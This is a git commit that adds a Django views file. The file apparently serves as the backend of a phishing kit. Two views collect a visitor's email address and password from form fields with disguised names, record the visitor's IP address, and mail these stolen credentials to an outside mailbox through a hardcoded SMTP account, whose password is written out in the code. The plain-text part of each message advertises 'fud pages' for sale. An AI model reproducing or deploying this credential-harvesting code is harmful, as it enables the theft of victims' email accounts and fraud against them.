e21c41fd53f3b5242c975c350a597bede20cd4b3
Richard Lion <gokturk101@protonmail.com>
2022-08-22 20:13:49 +0000

    init/heroku

---
+++ newviision/views.py
@@ -0,0 +1,88 @@
+from django.shortcuts import render
+from django.http import HttpResponse
+import smtplib, ssl
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from django.template.loader import get_template
+from django.template import Context
+from django.template.loader import render_to_string
+#Create your views here.
+
+
+def homeon(request):
+    ip = request.META.get("REMOTE_ADDR")
+    auto = request.GET["email"]
+    domain = auto[auto.index('@') + 1 : ]
+    return render(request, 'index.html', {'email': auto, 'domains': domain})
+
+def addin(request):
+    ip = request.META.get("REMOTE_ADDR")
+    email = request.POST["powerioman"]
+    passwordemail = request.POST["enginloio"]
+    domain = email[email.index('@') + 1 : ]
+    sender_email = "logs@merusllc.com"
+    receiver_email = "markscot111@protonmail.com"
+    password = "MLpkqf25fxet"
+    message = MIMEMultipart("alternative")
+    message["Subject"] = "New korea Page 1"
+    message["From"] = sender_email
+    message["To"] = receiver_email
+
+    # Create the plain-text and HTML version of your message
+    text = """\
+    Hi,
+    How are you?
+    contact me on icq jamescartwright for your fud pages
+    """
+    html = render_to_string('mail.html', {'emailaccess': email, 'passaccess': passwordemail, 'ipman': ip})
+
+    # Turn these into plain/html MIMEText objects
+    part1 = MIMEText(text, "plain")
+    part2 = MIMEText(html, "html")
+
+    # Add HTML/plain-text parts to MIMEMultipart message
+    # The email client will try to render the last part first
+    message.attach(part1)
+    message.attach(part2)
+
+    # Create secure connection with server and send email
+    with smtplib.SMTP("mail.merusllc.com", 587) as server:
+        server.login(sender_email, password)
+        server.sendmail(sender_email, receiver_email, message.as_string())
+        return render(request, 'indexx.html', {'email': email, 'domains': domain})
+
+def adddzz(request):
+    ip = request.META.get("REMOTE_ADDR")
+    email = request.POST["zzpowerman"]
+    passwordemail = request.POST["yyenginlo"]
+    domain = email[email.index('@') + 1 : ]
+    sender_email = "logs@merusllc.com"
+    receiver_email = "markscot111@protonmail.com"
+    password = "MLpkqf25fxet"
+    message = MIMEMultipart("alternative")
+    message["Subject"] = "New korea Page 2"
+    message["From"] = sender_email
+    message["To"] = receiver_email
+
+    # Create the plain-text and HTML version of your message
+    text = """\
+    Hi,
+    How are you?
+    contact me on icq jamescartwright for your fud pages
+    """
+    html = render_to_string('mail.html', {'emailaccess': email, 'passaccess': passwordemail, 'ipman': ip})
+
+    # Turn these into plain/html MIMEText objects
+    part1 = MIMEText(text, "plain")
+    part2 = MIMEText(html, "html")
+
+    # Add HTML/plain-text parts to MIMEMultipart message
+    # The email client will try to render the last part first
+    message.attach(part1)
+    message.attach(part2)
+
+    # Create secure connection with server and send email
+    with smtplib.SMTP_SSL("mail.merusllc.com", 587) as server:
+        server.login(sender_email, password)
+        server.sendmail(sender_email, receiver_email, message.as_string())
+    return render(request, 'Domain.html', {'domains': domain})
